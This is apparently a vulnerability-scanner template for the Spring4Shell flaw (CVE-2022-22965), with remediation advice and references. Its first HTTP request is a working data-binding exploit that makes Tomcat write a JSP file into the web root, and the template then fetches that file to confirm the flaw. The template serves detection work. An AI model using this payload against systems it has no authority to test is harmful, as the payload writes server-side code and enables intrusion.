id: CVE-2022-22965

info:
  name: Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell)
  author: justmumu,arall,dhiyaneshDK,akincibor
  severity: critical
  description: A Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.
  remediation: 5.3.x users should upgrade to 5.3.18+, 5.2.x users should upgrade to 5.2.20+.
  reference:
    - https://tanzu.vmware.com/security/cve-2022-22965
    - https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
    - https://twitter.com/RandoriAttack/status/1509298490106593283
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-22965
    cwe-id: CWE-770
  tags: cve,cve2022,rce,spring,injection,intrusive

requests:
  - raw:
      - | # Creates a JSP file that contains a static string to confirm the vulnerability.
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        c2: <%
        suffix: %>

        class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out.println(new%20String(%22SPRING_CORE_RCE%22))%3B%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=checkexploit&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

      - |
        GET /checkexploit.jsp HTTP/1.1
        Host: {{Hostname}}
        Test: {{wait_for(10)}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_2==200"
          - "contains(body_2, 'SPRING_CORE_RCE')"
        condition: and
